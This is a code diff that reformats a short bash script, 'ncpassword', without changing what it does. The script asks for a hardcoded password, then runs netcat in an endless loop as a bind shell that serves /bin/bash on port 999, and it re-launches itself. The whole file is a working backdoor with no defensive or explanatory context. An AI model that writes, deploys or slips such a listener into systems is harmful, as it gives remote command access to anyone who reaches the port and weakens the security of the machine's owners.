@@ -1,35 +1,31 @@
 #! /bin/bash
 #
+
 ncpassword () {
-NC="
-/bin/netcat"
 
-PORT="
-999"
+NC="/bin/nc"
 
-PASSWORD="
-123456"
+PORT="999"
 
-SHELL="
-/bin/bash"
+PASSWORD="123456"
 
-echo -n "
-Enter password: "
+SHELL="/bin/bash"
+
+echo -n "Enter password: "
 
 stty -echo
 read mypass
 stty echo
-if [ ${mypass} = $PASSWORD ]
- then
- echo "
-Access granted...start netcat shell on port $PORT"
 
- while true; do $NC -l -p $PORT -e $SHELL; done
- else
- echo "
-Incorrect Password"
+if [ ${mypass} = $PASSWORD ]
+	then
+		echo "Access granted...start netcat shell on port $PORT"
+		while true; do $NC -l -p $PORT -e $SHELL; done
+	else
+		echo "Incorrect Password"
 
 fi
 }
+
 ncpassword
 sh $0
